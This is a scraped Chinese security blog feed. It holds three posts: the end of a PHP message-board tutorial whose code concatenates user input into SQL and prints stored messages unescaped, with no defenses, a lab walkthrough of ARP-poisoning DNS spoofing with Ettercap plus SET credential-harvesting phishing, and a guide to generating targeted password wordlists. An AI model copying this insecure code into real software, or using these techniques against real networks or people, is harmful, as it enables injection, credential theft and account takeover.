&quot;&lt;td&gt;&lt;a href=&apos;delete_message.php?id=$message_ID&apos;&gt;删除此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&lt;a href=&apos;update_message_page.php?id=$message_ID&apos;&gt;编辑此条留言&lt;/a&gt;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 使用GET方式通过&lt;a&gt;标签将留言ID发送到对应功能或页面。 4.2主页面（显示留言）12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;edit_message_page.php&quot;&gt;编辑留言&lt;/a&gt; &lt;table border=1&gt; &lt;tr&gt; &lt;th&gt;发送人&lt;/th&gt; &lt;th&gt;接收人&lt;/th&gt; &lt;th&gt;发送时间&lt;/th&gt; &lt;th&gt;留言内容&lt;/th&gt; &lt;/tr&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select * from messages where sender=&apos;$userName&apos; or receiver=&apos;$userName&apos; or receiver=&apos;all&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;tr&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;sender&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;receiver&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;time&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;.$result[&apos;content&apos;].&quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 4.3登陆页面123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板&lt;/h1&gt; &lt;a href=&quot;signup_page.php&quot;&gt;注册&lt;/a&gt; &lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.4发布留言页面123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;发送留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;br&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;form action=&quot;send_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.5注册页面12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;留言板注册&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;留言板注册&lt;/h1&gt; &lt;form action=&quot;signup.php&quot; method=&quot;POST&quot;&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt; &lt;br&gt; &lt;br&gt; 昵&amp;nbsp;&amp;nbsp;&amp;nbsp;称：&lt;input type=&quot;text&quot; name=&quot;Name&quot;&gt; &lt;br&gt; &lt;br&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 4.6修改留言页面1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;?php session_start(); if(empty($_SESSION[&apos;userName&apos;]))&#123; header(&quot;location:login_page.php&quot;); &#125; $userName=$_SESSION[&apos;userName&apos;]; $message_ID=$_GET[&apos;id&apos;];?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;编辑留言&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $ip=&quot;localhost&quot;; $account=&quot;root&quot;; $password=&quot;root&quot;; $connect=new pdo(&quot;mysql:host=$ip;dbname=MessageBoard&quot;,$account,$password); $query=&quot;select Name from user where Name!=&apos;$userName&apos;;&quot;; $res=$connect-&gt;prepare($query); $res-&gt;execute(); ?&gt; &lt;h1&gt;编辑留言&lt;/h1&gt; &lt;?php echo &quot;欢迎&quot;.$userName; ?&gt; &lt;a href=&quot;home.php&quot;&gt;返回留言板&lt;/a&gt; &lt;a href=&quot;send_message_page.php&quot;&gt;发送留言&lt;/a&gt; &lt;a href=&quot;logout.php&quot;&gt;退出留言板&lt;/a&gt; &lt;form action=&quot;update_message.php&quot; method=&quot;POST&quot;&gt; 接收人: &lt;select name=&quot;receiver&quot;&gt; &lt;option value=&quot;all&quot;&gt;所有人&lt;/option&gt; &lt;?php while ($result=$res-&gt;fetch(PDO::FETCH_ASSOC)) &#123; $name=$result[&apos;Name&apos;]; echo &quot;&lt;option value=&apos;$name&apos;&gt;&quot;.$name.&quot;&lt;/option&gt;&quot;; &#125; ?&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;hidden&quot; name=&quot;ID&quot; value=&quot;&lt;?php echo $message_ID; ?&gt;&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/body&gt;&lt;/html&gt; 5.PDOPDO是 PHP Date Object （PHP数据对象）的简称，目前支持的数据库包括Firebird， FreeTDS，Interbase ，MySQL，MS SQL Server， ODBC, Oracle，Postgre SQL，SQLite 以及 Sybase等。有了PDO，用户就不必再使用 mysql_*函数，aco_函数或者 mssql_\\函数，也不必再将他们封装到数据库操作类，只需要使用PDO接口中的方法就可以对不同的数据库进行操作，在选择不同数据库时，只需要修改PDO的 DNS（数据库名）就可以了。 5.1PDO构造函数连接数据库PDO构造函数的形式： 1_construct(string $dsn[,string $username[,string $password[,array $driver_options]]]) $dsn：主机IP地址及数据库名称 1$dsn=\"mysql:host=$host;dbName=$dbName\" $username：数据库用户名$password：数据库密码$driver_options：连接数据库的其他选项 通过PDO连接数据库 12345678910111213&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); echo \"Connect successed.\"; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2使用PDO执行SQL语句在PDO中，可以使用3中方式执行SQL语句，分别是exec()方法，query方法，以及预处理语句prepare()和execute()方法 5.2.1PDO::exec()方法exec()方法形式如下： 1int PDO::exec(string $statement) PDO::exec()执行一条SQL语句，并返回受影响的行数。$statement是要执行的SQL语句。 通过exec()方法执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;exec($query); echo \"数据插入成功,受影响行数为：\".$result; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.2PDO::query()方法query()方法形式如下： 1PDOStatement PDO::query(string $statement) PDO::query()可执行多条SQL语句，并以PDOStatement对象形式返回结果集。 通过PDO::query()执行SQL语句 123456789101112131415&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;query($query); print_r($result); &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.2.3预处理语句：PDO::prepare()语句和execute()语句PDO::prepare()方法形式如下： 1PDOStatement PDO::prepare(string $statement[,array $driver_options]) PDOStatement::execute方法形式如下： 1bool PDOStatement::execute([array $input_parameters]) PDO::prepare()方法为PDOStatement::execute()方法准备待执行的SQL语句。SQL 语句可以包含零个或多个参数占位标记，格式是命名（:name）或问号（?）的形式，当它执行时将用真实数据取代。 在同一个 SQL 语句里，命名形式和问号形式不能同时使用；只能选择其中一种参数形式。PDOStatement::execute()方法执行一条预处理语句。 使用预处理语句执行SQL语句： 123456789101112131415161718&lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $host=\"localhost\"; $account=\"root\"; $password=\"root\"; $dbname=\"MessageBoard\"; try&#123; $connect=new PDO(\"mysql:host=$host;dbname=$dbname,$account,$password); $query=\"insert into `user` (userName,Password,Name) values('chessur','chessur','chessur');\" $result=$connect-&gt;prepare($query); $res-&gt;execute(); while($result=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123; echo $result['userName'].$result['Password'].$result[Name]; &#125; &#125;catch (Exception $error)&#123; echo $error-&gt;getMessage().\"&lt;br&gt;\"; &#125;?&gt; 5.3PDOStatement::fetch5.3.1PDOStatement::fetchPDOStatement::fetch形式如下： 1mixed PDOStatement::fetch ([ int $fetch_style [, int $cursor_orientation = PDO::FETCH_ORI_NEXT [, int $cursor_offset = 0 ]]] ) 5.3.1.1参数-$fetch_style控制下一行如何返回给调用者。此值必须是 PDO::FETCH_* 系列常量中的一个，缺省为 PDO::ATTR_DEFAULT_FETCH_MODE的值 （默认为 PDO::FETCH_BOTH）。 参数 效果 PDO::FETCH_ASSOC 返回一个索引为结果集列名的数组 PDO::FETCH_BOTH（默认） 返回一个索引为结果集列名和以0开始的列号的数组 PDO::FETCH_BOUND 返回 TRUE ，并分配结果集中的列值给 PDOStatement::bindColumn() 方法绑定的 PHP 变量。 PDO::FETCH_CLASS 返回一个请求类的新实例，映射结果集中的列名到类中对应的属性名。如果 fetch_style 包含 PDO::FETCH_CLASSTYPE（例如：PDO::FETCH_CLASS PDO::FETCH_INTO 更新一个被请求类已存在的实例，映射结果集中的列到类中命名的属性 PDO::FETCH_LAZY 结合使用 PDO::FETCH_BOTH 和 PDO::FETCH_OBJ，创建供用来访问的对象变量名 PDO::FETCH_NUM 返回一个索引为以0开始的结果集列号的数组 PDO::FETCH_OBJ 返回一个属性名对应结果集列名的匿名对象 5.3.1.2参数-$cursor_orientation对于 一个 PDOStatement 对象表示的可滚动游标，该值决定了哪一行将被返回给调用者。此值必须是 PDO::FETCH_ORI_* 系列常量中的一个，默认为 PDO::FETCH_ORI_NEXT。要想让 PDOStatement 对象使用可滚动游标，必须在用 PDO::prepare() 预处理SQL语句时，设置 PDO::ATTR_CURSOR 属性为 PDO::CURSOR_SCROLL。 5.3.1.3参数-$offset对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_ABS 的PDOStatement 对象代表的可滚动游标，此值指定结果集中想要获取行的绝对行号。 对于一个 cursor_orientation 参数设置为 PDO::FETCH_ORI_REL 的PDOStatement 对象代表的可滚动游标，此值指定想要获取行相对于调用 PDOStatement::fetch() 前游标的位置 5.3.2PDOStatement::fetchAllPDOStatement::fetchAll形式如下 1array PDOStatement::fetchAll ([ int $fetch_style [, mixed $fetch_argument [, array $ctor_args = array() ]]] ) 5.3.2.1参数-$fetch_style控制返回数组的内容如同 PDOStatement::fetch() 文档中记载的一样。默认为 PDO::ATTR_DEFAULT_FETCH_MODE 的值（ 其缺省值为 PDO::FETCH_BOTH ） 想要返回一个包含结果集中单独一列所有值的数组，需要指定 PDO::FETCH_COLUMN 。通过指定 column-index 参数获取想要的列。 想要获取结果集中单独一列的唯一值，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_UNIQUE 按位或。 想要返回一个根据指定列把值分组后的关联数组，需要将 PDO::FETCH_COLUMN 和 PDO::FETCH_GROUP 按位或。 5.3.2.2参数-$fetch_argument 参数 效果 PDO::FETCH_COLUMN 返回指定以0开始索引的列 PDO::FETCH_CLASS 返回指定类的实例，映射每行的列到类中对应的属性名 PDO::FETCH_FUNC 将每行的列作为参数传递给指定的函数，并返回调用函数后的结果 5.3.2.3参数-$ctor_args当 fetch_style 参数为 PDO::FETCH_CLASS 时，自定义类的构造函数的参数。 5.3.3PDOStatement::fetchColumnPDOStatement::fetchColumn形式如下： 1string PDOStatement::fetchColumn ([ int $column_number = 0 ] ) 5.3.3.1参数-column_number你想从行里取回的列的索引数字（以0开始的索引）。如果没有提供值，则 PDOStatement::fetchColumn() 获取第一列。 5.3.4PDOStatement::fetchObjectPDOStatement::fetchObject形式如下： 1mixed PDOStatement::fetchObject ([ string $class_name = \"stdClass\" [, array $ctor_args ]] ) 5.3.4.1参数-class_name创建类的名称。 5.3.4.2参数-ctor_args此数组的元素被传递给构造函数。 6.缺陷没有考虑防御手段。 7.参考[1] php实现留言板功能 [2] PDO中执行SQL语句的三种方法 [3] PDO中获取结果集之fetch()方法详解 [4] T-SQL教程 [5] PHP Sessions [6] PHP:PDO-Manual","categories":[],"tags":[]},{"title":"'使用Ettercap和SET进行DNS欺骗、钓鱼'","slug":"I-can-not-see-U","date":"2019-03-26T11:51:17.000Z","updated":"2019-07-04T11:21:40.448Z","comments":true,"path":"2019/03/26/I-can-not-see-U/","link":"","permalink":"https://chirec.github.io/2019/03/26/I-can-not-see-U/","excerpt":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。","text":"1.工具介绍1.1Ettercap Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis. 1.2SET(Socail-Engineering-Toolkit) Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。 2.工具使用2.1Ettercap参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Usage: ettercap [OPTIONS] [TARGET1] [TARGET2]TARGET is in the format MAC/IP/IPv6/PORTs (see the man for further detail)Sniffing and Attack options: -M, --mitm &lt;METHOD:ARGS&gt; perform a mitm attack -o, --only-mitm don&apos;t sniff, only perform the mitm attack -b, --broadcast sniff packets destined to broadcast -B, --bridge &lt;IFACE&gt; use bridged sniff (needs 2 ifaces) -p, --nopromisc do not put the iface in promisc mode -S, --nosslmitm do not forge SSL certificates -u, --unoffensive do not forward packets -r, --read &lt;file&gt; read data from pcapfile &lt;file&gt; -f, --pcapfilter &lt;string&gt; set the pcap filter &lt;string&gt; -R, --reversed use reversed TARGET matching -t, --proto &lt;proto&gt; sniff only this proto (default is all) --certificate &lt;file&gt; certificate file to use for SSL MiTM --private-key &lt;file&gt; private key file to use for SSL MiTMUser Interface Type: -T, --text use text only GUI -q, --quiet do not display packet contents -s, --script &lt;CMD&gt; issue these commands to the GUI -C, --curses use curses GUI -D, --daemon daemonize ettercap (no GUI) -G, --gtk use GTK+ GUILogging options: -w, --write &lt;file&gt; write sniffed data to pcapfile &lt;file&gt; -L, --log &lt;logfile&gt; log all the traffic to this &lt;logfile&gt; -l, --log-info &lt;logfile&gt; log only passive infos to this &lt;logfile&gt; -m, --log-msg &lt;logfile&gt; log all the messages to this &lt;logfile&gt; -c, --compress use gzip compression on log filesVisualization options: -d, --dns resolves ip addresses into hostnames -V, --visual &lt;format&gt; set the visualization format -e, --regex &lt;regex&gt; visualize only packets matching this regex -E, --ext-headers print extended header for every pck -Q, --superquiet do not display user and passwordLUA options: --lua-script &lt;script1&gt;,[&lt;script2&gt;,...] comma-separted list of LUA scripts --lua-args n1=v1,[n2=v2,...] comma-separated arguments to LUA script(s)General options: -i, --iface &lt;iface&gt; use this network interface -I, --liface show all the network interfaces -Y, --secondary &lt;ifaces&gt; list of secondary network interfaces -n, --netmask &lt;netmask&gt; force this &lt;netmask&gt; on iface -A, --address &lt;address&gt; force this local &lt;address&gt; on iface -P, --plugin &lt;plugin&gt; launch this &lt;plugin&gt; -F, --filter &lt;file&gt; load the filter &lt;file&gt; (content filter) -z, --silent do not perform the initial ARP scan -6, --ip6scan send ICMPv6 probes to discover IPv6 nodes on the link -j, --load-hosts &lt;file&gt; load the hosts list from &lt;file&gt; -k, --save-hosts &lt;file&gt; save the hosts list to &lt;file&gt; -W, --wifi-key &lt;wkey&gt; use this key to decrypt wifi packets (wep or wpa) -a, --config &lt;config&gt; use the alterative config file &lt;config&gt;Standard options: -v, --version prints the version and exit -h, --help this help screen 2.2SET1234561) Social-Engineering Attacks2) Penetration Testing (Fast-Track)3) Third Party Modules4) Update the Social-Engineer Toolkit5) Update SET configuration6) Help, Credits, and About 1234567891011 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors10) SMS Spoofing Attack Vector11) Third Party Modules 123456781) Java Applet Attack Method2) Metasploit Browser Exploit Method3) Credential Harvester Attack Method4) Tabnabbing Attack Method5) Web Jacking Attack Method6) Multi-Attack Web Method7) Full Screen Attack Method8) HTA Attack Method 1231) Web Templates2) Site Cloner3) Custom Import 1231. Java Required2. Google3. Twitter 3.实验过程3.1生成钓鱼网页生成钓鱼网页之后，使用Windows7访问，并输入账号密码进行测试，在Kali中获得输入的信息。 3.2DNS欺骗使用Ettercap进行DNS欺骗，这里使用图形化界面，也可以直接在终端输入命令。直接输入命令可以查看参考[1]。 Step 1：Scan for Hosts，然后打开Hosts List Step 2：Add to Target Step 3：Mitm 选择ARP poisoning，勾选Sniff remote connection Step 4：Plugins，选择dns_spoof 3.3钓鱼结果在进行DNS欺骗后，使用Windows7，访问www.jj.com。此时，页面显示的是之前的钓鱼网页。 输入账号密码进行测试。 4.原理DNS欺骗是一种中间人攻击形式，攻击者冒充域名服务器，向主机提供错误DNS信息，当用户尝试浏览网页时，跳转到错误的攻击者的主页。再通过钓鱼网站可以获取用户的关键信息。 5.参考[1] 技术讨论 | 利用SET和Ettercap实现内网钓鱼获取帐号密码 [2] DNS欺骗原理及其防御方案","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'生成社工字典'","slug":"Generate-Social-Engineering-Wordlist","date":"2019-03-25T12:10:41.000Z","updated":"2019-03-25T13:41:44.578Z","comments":true,"path":"2019/03/25/Generate-Social-Engineering-Wordlist/","link":"","permalink":"https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/","excerpt":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典","text":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典 2.工具下载2.1pydictor1git clone https://github.com/LandGrey/pydictor.git 2.2cupper1git clone https://github.com/ChireC/cupper.git 3.工具使用3.1pydictor3.1.1参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263optional arguments: -h, --help show this help message and exit -base Type Choose from (d, L, c, dL, dc, Lc, dLc) d digital [0 - 9] L lowercase letters [a - z] c capital letters [A - Z] dL Mix d and L [0-9 a-z] dc Mix d and c [0-9 A-Z] Lc Mix L and c [a-z A-Z] dLc Mix d, L and dL [0-9 a-z A-Z] -char character 使用自定义字符集生成字典 -chunk arg [arg ...] 使用排列组合生成字典 -extend arg [arg ...] 拓展字典 //插件生成字典 -plug arg [arg ...] 一段时间内生日生成字典 [begin_date] [end_date], date format: [YYYYMMDD] ftp [keyword1] [keyword2] ... 身份证后4位生成字典 chinese id card last 4 digit 身份证后6位生成字典 chinese id card last 6 digit 身份证后8位生成字典 chinese id card last 8 digit 网页原始关键词生成字典 [url_or_file] --conf [file_path] 使用语法引擎解析字典 --sedb 进入社会工程学字典生成界面 -o path, --output path 设置输入文件位置 -tool arg [arg ...] 字典合并 [dir] 字典比较 [minuend_file] [subtrahend_file] 词频统计 [&apos;v&apos;,&apos;s&apos;,&apos;vs&apos;] [file] [view_num] 字典处理 [file] 多字典文件组合 [file1] [file2] ... 安全擦除字典 [file_or_dir] 合并去重 [dir] 字典去重 [file] --len minlen maxlen 设置生成密码长度 Default: min=0 max=4 --head prefix 为密码开头增加字符 --tail suffix 为密码结尾增加字符 //编码格式 --encode encode b16 base16 encode b32 base32 encode b64 base64 encode des des algorithm and need modify code execjs execute js function and need modify code hmac hmac message digest algorithm md5 md5 message digest algorithm output 32 char md516 md5 message digest algorithm output 16 char none default and don&apos;t encode rsa rsa algorithm and need modify code sha1 sha-1 message digest algorithm sha256 sha-256 message digest algorithm sha512 sha-512 message digest algorithm test custom yourself encode method by modifying function //自定义编码方式 url url encode//出现字母和数字设置范围 --occur letter digital special Default: letter &quot;&lt;=99&quot; digital &quot;&lt;=99&quot; special &quot;&lt;=99&quot; --types letter digital special Default: letter &quot;&gt;=0&quot; digital &quot;&gt;=0&quot; special &quot;&gt;=0&quot; --regex regex Filter by regex, Default: (.*?)//正则表达式过滤 --level code Use code [1-5] to filter results, default: 3 //密码等级 --leet code [code ...] Choose leet mode code (0, 1, 2, 11-19, 21-29) 3.1.2生成社工字典 1234567891011121314151617181920python pydictor.py --sedbset cname liweiset sname lw Lweiset ename zwellset birth 19880916set usedpwd liwei123456. liwei@19880916 lw19880916_123set phone 18852006666set uphone 15500998080set hphone 76500100 61599000 01061599000set email 33125500@qq.comset email 13561207878@163.comset email weiweili@gmail.comset email wei010wei@hotmail.comset postcode 663321 962210set nickname zliliset idcard 152726198809160571set jobnum 20051230 100563set otherdate 19591004 19621012set otherdate 19870906 19880208set usedchar tiger gof gamesthrones 176003 m0n5ter ppdog 3.1.3字典分析由目标信息组合成的各种密码，由于这次填写的信息比较多，所以在字典中没有弱口令，在之前的测试中，并没有填写很多目标信息，导致字典中弱口令很多。 3.1.4使用体验在设置对象信息时，如果出现错误，会直接跳出社会工程字典生成模块，并且再次进入模块不会保存上次填写的信息。 3.2cupper3.2.1参数1234567optional arguments: -h, --help show this help message and exit -f FILE, --file FILE 对密码文件进行各种处理 -i, --interactive 交互式生成密码字典 -s, --session 管理保存输入信息的session文件 -d, --download 下载作者维护的密码字典 -v, --version 查看Logo和显示工具版本 3.2.2生成社工字典 3.2.3使用体验因为是交互式界面，所以很舒服，按照提示填写目标信息即可，要求目标信息非常多，非常详细，而且还可以根据目标对密码的了解程度，以及你生成密码的目的添加信息的信息和参数。如果目标很了解密码，还会生成加密后的密码，如果需要目标社交网络上登陆密码，还要求输入目标站点的名称。 4.参考[1] pydictor-GitHub [2] cupper-GitHub","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'使用PHP编写留言板'","slug":"Create-Message-Board-with-PHP","date":"2019-03-24T07:36:54.000Z","updated":"2019-03-24T13:19:08.425Z","comments":true,"path":"2019/03/24/Create-Message-Board-with-PHP/","link":"","permalink":"https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/","excerpt":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类","text":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: 